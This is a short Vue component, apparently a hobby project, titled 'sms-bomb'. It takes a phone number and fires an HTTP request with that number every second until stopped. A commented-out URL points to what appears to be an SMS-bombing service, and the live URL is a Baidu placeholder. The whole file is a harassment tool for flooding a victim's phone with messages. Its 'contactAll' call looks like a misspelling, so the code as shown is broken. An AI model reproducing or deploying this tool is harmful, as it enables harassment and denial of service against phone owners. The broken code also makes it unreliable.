<template lang="pug">
  .section
    h2.h2 sms-bomb

    el-input(v-model.number="phone")

    el-button(
      type="success"
      v-stream:click="start$"
    ) 开始

    el-button(
      type="primary"
      v-stream:click="stop$"
    ) 停止
</template>

<script>
import { Observable } from 'rxjs'
import { get$ } from 'rhttp'

// const BOMBURL = `https://boom.nange.cn/index.php?hm=`
const BOMBURL = `https://www.baidu.com/s?`

export default {
  name: 'SmsBomb',

  domStreams: ['start$', 'stop$'],

  data () {
    return {
      phone: ''
    }
  },

  subscriptions () {
    const bombTask$ = contactAll(Observable.interval(1000), this.start$)
      .flatMap(_ => get$(`${BOMBURL}${this.phone}`))
      .takeUntil(this.stop$)

      return {
        bombTask$
      }
  }
}
</script>

